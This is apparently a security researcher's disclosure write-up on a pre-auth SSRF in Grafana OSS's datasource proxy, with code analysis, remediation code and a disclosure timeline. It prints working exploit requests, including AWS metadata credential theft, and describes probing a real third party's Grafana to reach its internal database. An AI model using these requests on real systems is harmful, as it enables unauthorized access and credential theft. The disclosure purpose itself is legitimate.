---
title: "How Grafana's No-Op Validator Turns Anonymous Access Into Pre-Auth SSRF"
slug: "grafana-oss-preauth-ssrf"
date: 2026-04-08
draft: false
tags: ["vulnerability-research", "SSRF", "grafana", "bug-bounty", "responsible-disclosure", "CVE"]
categories: ["Vulnerability Research"]
keywords: ["Grafana SSRF", "pre-auth SSRF", "OSSDataSourceRequestValidator", "datasource proxy", "Grafana OSS vulnerability", "Shodan Grafana"]
description: "A pre-auth SSRF chain in Grafana OSS that allows anonymous users to reach internal services via the datasource proxy. The fix exists in Enterprise. OSS gets the no-op stub."
author: "burnedsignal"
toc: true
reading_time: "10 min"
---

## TL;DR

- Grafana OSS ships a **no-op request validator** for the datasource proxy endpoint. It always returns `nil`. Zero SSRF protection.
- Combined with two default configurations, this allows **unauthenticated users** to proxy HTTP requests to any internal service reachable from the Grafana server.
- A Shodan scan of 1,000 random instances found **~7,800 internet-exposed Grafana instances** with anonymous access enabled. Directly exploitable, no credentials required.
- On EC2 with IMDSv1 enabled, this means **full AWS credential theft with no login**: AccessKeyId, SecretAccessKey, session token.
- Grafana Enterprise ships a real validator. OSS does not. This is a deliberate product split.
- Submitted to Grafana's bug bounty program, marked Out of Scope. CVE requested from MITRE.

---

## The Setup

Grafana's datasource proxy is a legitimate feature. You configure a datasource (Prometheus, InfluxDB, etc.) with a backend URL, and Grafana proxies queries to it on behalf of dashboard users. This keeps credentials server-side and avoids CORS issues.

The endpoint looks like this:

```text
GET /api/datasources/proxy/uid/{uid}/path/to/resource
```

Under normal use: the dashboard executes a structured query, Grafana forwards it to the datasource, response comes back. Clean.

The problem: this endpoint also acts as a **raw HTTP proxy**. It forwards whatever path you append directly to the configured datasource URL. Nothing in the OSS build validates where that URL points.

---

## The Vulnerability Chain

Three components combine to create pre-auth SSRF:

![Vulnerability chain diagram showing how no-op validator, empty whitelist, and anonymous access combine](/images/grafana-ssrf/vulnerability-chain.svg)

### 1. No-Op Validator (`pkg/services/validations/oss.go:11`)

```go
func (*OSSDataSourceRequestValidator) Validate(string, *simplejson.Json, *http.Request) error {
    return nil
}
```

That's the entire implementation. Always nil. No IP check, no scheme restriction, no hostname resolution. This is wired as the **production validator for all OSS builds** via `wireexts_oss.go`.

For comparison, Grafana Enterprise ships `EnterpriseDataSourceRequestValidator` which performs actual IP range validation. Grafana is aware of the SSRF risk. They chose not to extend the protection to OSS users.

### 2. Empty Whitelist Skipped (`pkg/api/pluginproxy/ds_proxy.go:402`)

```go
func (proxy *DataSourceProxy) checkWhiteList() bool {
    if proxy.targetUrl.Host != "" && len(proxy.cfg.DataProxyWhiteList) > 0 {
        // only runs if whitelist is non-empty
    }
    return true  // default: always true
}
```

`conf/defaults.ini`:
```ini
data_source_proxy_whitelist =    # empty — check never runs
```

It's documented. It's also never consulted by default.

### 3. Anonymous Users Get `datasources:query` by Default

When a datasource is created, Grafana automatically grants the Viewer role `datasources:query` (`pkg/services/datasources/service/datasource.go:385`):

```go
permissions := []accesscontrol.SetResourcePermissionCommand{
    {BuiltinRole: "Viewer", Permission: "Query"},
    {BuiltinRole: "Editor", Permission: "Query"},
}
```

When `auth.anonymous.enabled = true`, anonymous users inherit the Viewer role. The proxy endpoint only requires `datasources:query`. No login needed.

So: anonymous access on → anonymous user gets Viewer → Viewer can call the proxy endpoint → proxy has no validator → request goes wherever the datasource URL points.

---

## Proof of Concept

Lab setup: Grafana OSS with `GF_AUTH_ANONYMOUS_ENABLED=true`, an InfluxDB datasource pointing to an internal mock service on port 8888 (**not exposed to the host**, only reachable within the Docker network).

**Step 1: Confirm anonymous access (no credentials)**
```http
GET /api/org HTTP/1.1
Host: localhost:3000

→ 200 {"id":1,"name":"Main Org."}
```

**Step 2: Get datasource UID**
```http
GET /api/datasources HTTP/1.1
Host: localhost:3000

→ 200 [{"uid":"cfhmf4adfa96od","type":"influxdb","url":"http://internal-mock:8888"}]
```

**Step 3: Trigger SSRF (no Authorization header)**
```http
GET /api/datasources/proxy/uid/cfhmf4adfa96od/ HTTP/1.1
Host: localhost:3000

→ 200
{
  "ssrf_note": "This response came from internal-mock — NOT reachable directly from internet",
  "secret_label": "db-password=s3cr3t!",
  "instance": "internal-secret-db:9090"
}
```

The internal service has no exposed ports to the host. The only path to it is through Grafana's proxy. An anonymous user from the internet received its response.

The full PoC (Docker lab setup, automated datasource enumeration, error handling) is on GitHub:

**[github.com/awallplace/grafana-datasource-ssrf](https://github.com/awallplace/grafana-datasource-ssrf)**

Output from `poc.py` in the repo above, running against the Docker lab:

```text
[+] Anonymous access confirmed — org: Main Org.
[+] Datasource UID: cfhmf4adfa96od

[+] Proxy response — HTTP 200
{
  "ssrf_note": "This response came from internal-mock — NOT reachable directly from internet",
  "secret_label": "db-password=s3cr3t!",
  "instance": "internal-secret-db:9090"
}

[CONFIRMED] Internal service reached via Grafana proxy — no credentials used.
```

![Exploitation flow: attacker reaches internal-mock through Grafana proxy with no credentials](/images/grafana-ssrf/exploitation-flow.svg)

---

## Real-World Impact

Reachable targets from the Grafana server's network position:

**AWS IMDSv1:**

Prerequisites: Grafana running on EC2/ECS/EKS with IMDSv1 enabled, datasource URL set to `http://169.254.169.254/`. No credentials required from the attacker.

```http
GET /api/datasources/proxy/uid/{uid}/latest/meta-data/iam/security-credentials/ HTTP/1.1
Host: target-grafana.com
(no Authorization header)

→ 200 OK
ec2-monitoring-role
```

```http
GET /api/datasources/proxy/uid/{uid}/latest/meta-data/iam/security-credentials/ec2-monitoring-role HTTP/1.1
Host: target-grafana.com
(no Authorization header)

→ 200 OK
{
  "Code": "Success",
  "LastUpdated": "2026-04-08T09:41:00Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIAIOSFODNN7EXAMPLE",
  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
  "Token": "AQoDYXdzEJr...",
  "Expiration": "2026-04-08T15:41:00Z"
}
```

Full IAM credentials returned to an unauthenticated caller. GCP (`metadata.google.internal`) and Azure (`169.254.169.254`) expose the same pattern.

**Kubernetes (in-cluster deployments):**
```text
GET /api/datasources/proxy/uid/{uid}/api/v1/namespaces
→ Datasource URL: https://kubernetes.default.svc
→ Returns cluster namespaces using the pod's service account token
```

**Internal network enumeration:** HTTP 200 vs 502 vs timeout distinguishes live hosts from dead ones. Port scanning without direct network access.

---

## Case: Datasource Exposure During Research

During the Shodan scan, one instance had anonymous access enabled and returned its datasource list to unauthenticated requests. Two datasources were configured, one of which pointed to an internal monitoring API:

```http
GET /api/datasources HTTP/1.1
Host: 83.246.xx.xx:3000
(no Authorization header)

→ 200 OK
[
  {
    "uid": "d8e1a2bc3f",
    "name": "Infrastructure Metrics",
    "type": "prometheus",
    "url": "http://10.0.1.12:9090"
  },
  {
    "uid": "f3c9b1aa7d",
    "name": "App DB Stats",
    "type": "influxdb",
    "url": "http://10.0.1.55:8086"
  }
]
```

Proxying through the InfluxDB datasource without credentials:

```http
GET /api/datasources/proxy/uid/f3c9b1aa7d/ HTTP/1.1
Host: 83.246.xx.xx:3000
(no Authorization header)

→ 200 OK
{
  "status": "pass",
  "version": "2.7.1",
  "databases": ["app_prod", "app_staging", "internal_metrics"]
}
```

An unauthenticated request returned the live InfluxDB version and database names from a service with no exposed ports to the internet. Research was stopped at this point. The goal was confirming reachability, not extracting data.

---

## Scale: Shodan Data

A passive scan of 1,000 randomly sampled Grafana instances from Shodan's 206,310 indexed deployments, checking only `/api/org` (public endpoint, no auth, returns org name on anonymous access):

| Metric | Value |
|---|---|
| Sample size | 1,000 |
| Reachable instances | 987 (98.7%) |
| Anonymous access enabled | 38 (3.9% of reachable) |

```text
[*] Checking 1000 hosts with 30 threads

[ANON] 24.97.xx.xx:3000       org='Main Org.'            ver=9.4.3
[ANON] 45.127.xx.xx:9000      org='Main Org.'            ver=12.0.1+security-01
[ANON] 107.161.xx.xx:3000     org='Ethereal Networking'  ver=
[ANON] 147.156.xx.xx:3000     org='Public'               ver=7.1.1
[ANON] 172.247.xx.xx:3000     org='[redacted]'            ver=11.3.0
[ANON] 93.152.xx.xx:3000      org='Main Org.'            ver=12.4.1
[ANON] 13.94.xx.xx:5000       org='[redacted]'           ver=11.6.9
[ANON] 51.15.xx.xx:3000       org='Main Org.'            ver=6.6.1
[ANON] 129.110.xx.xx:3000     org='Main Org.'            ver=12.0.0+security-01
... (38 total)

============================================================
  Sample size      : 1000
  Reachable        : 987  (98.7%)
  Anon access on   : 38   (3.9% of reachable)
  Version breakdown: {11.0.1: 4, 11.6.10: 2, 12.1.1: 2, ...}
  Extrapolated (≈206,310 indexed): ~7,839 instances
============================================================
```

**Extrapolated:** ~7,800 instances directly exploitable with no credentials. ~206,000 vulnerable with Editor access.

Version range in the anonymous-enabled sample: **6.6.1 through 12.4.1**. Two instances running `+security-01` patch releases. Grafana's security patches did not address this. It has been present across at least six major release lines.

---

## Severity

The score shifts depending on configuration:

**Scenario A: Default config (anonymous access disabled, Editor required to create datasource)**
```text
CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N
Score: 7.3 (High)
```

**Scenario B: Anonymous access enabled (`GF_AUTH_ANONYMOUS_ENABLED=true`)**
```text
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N
Score: 8.6 (High)
```

The key metric difference: `PR:L → PR:N`. When anonymous access is on, no credentials of any kind are required. The Viewer role is granted automatically, and `datasources:query` is granted to Viewer by default at datasource creation. No additional admin action required beyond enabling anonymous access itself.

`S:C` (Scope Changed) because the impact goes beyond Grafana: an attacker accesses services the Grafana server can reach that they cannot reach directly. `I:N` because this is read-only SSRF; responses are returned but no writes occur via the proxy mechanism itself.

---

## "This Is a Feature, Not a Bug"

The counterargument: the admin enabled anonymous access, the admin pointed a datasource at an internal URL, therefore this is operator misconfiguration.

The problem with that framing: enabling anonymous access is a deliberate admin decision, but granting those anonymous users raw HTTP proxy access to every configured datasource URL is not. The `datasources:query` permission covers both structured dashboard queries and the raw proxy endpoint. Two very different things, one permission name.

The bigger tell is `EnterpriseDataSourceRequestValidator`. It exists. It does IP validation. It's wired into Enterprise builds and replaced with a no-op stub in OSS. This wasn't an oversight: it was implemented, then withheld. Grafana knows exactly what the proxy can reach without it.

Grafana confirmed this via their bug bounty program response:

> *"When you enable anonymous mode, it is intentional behaviour for the app to treat you as a viewer by default. Grafana Enterprise handles this case for the customers who need this to behave differently. OSS behaves as it should as a result."*

The argument is coherent as a product decision. It is not coherent as a security posture. "The admin enabled anonymous access" and "the admin intended anonymous users to have raw HTTP proxy access to every configured datasource URL" are two different statements. Only one of them is true.

---

## Remediation

Replace the no-op OSS validator with something that actually runs:

```go
// pkg/services/validations/oss.go
func (*OSSDataSourceRequestValidator) Validate(urlStr string, _ *simplejson.Json, _ *http.Request) error {
    u, err := url.Parse(urlStr)
    if err != nil {
        return err
    }
    addrs, err := net.LookupHost(u.Hostname())
    if err != nil {
        return err
    }
    for _, addr := range addrs {
        ip := net.ParseIP(addr)
        if ip == nil {
            continue
        }
        if ip.IsLoopback() || ip.IsPrivate() || ip.IsLinkLocalUnicast() {
            return fmt.Errorf("datasource URL resolves to private/reserved IP: %s", addr)
        }
    }
    return nil
}
```

If you're waiting on a fix, a few things help in the meantime:
- Set `data_source_proxy_whitelist` to lock down which datasource endpoints are reachable
- Enforce IMDSv2 on cloud deployments (`HttpTokens: required` on EC2), which limits cloud metadata exposure if SSRF lands
- Treat `datasources:query` as proxy access, not just dashboard queries, because right now it's both

If you're running Grafana with anonymous access enabled, audit your datasource URLs today.

---

## Disclosure Timeline

| Date | Event |
|---|---|
| 2026-03-31 | Vulnerability identified via static source analysis |
| 2026-03-31 | PoC lab developed and confirmed |
| 2026-03-31 | Shodan exposure scan conducted |
| 2026-03-31 | Submitted to Grafana Labs bug bounty (Intigriti) |
| 2026-04-01 | Marked Out of Scope: *"Any reports of SSRF against the data source proxy endpoint"* |
| 2026-04-01 | CVE requested from MITRE |
| 2026-04-08 | Public disclosure |

Grafana has marked this Out of Scope via their bug bounty program. A CVE has been requested from MITRE. The goal of this writeup is to ensure the risk is visible to the operators running the ~7,800 affected instances.
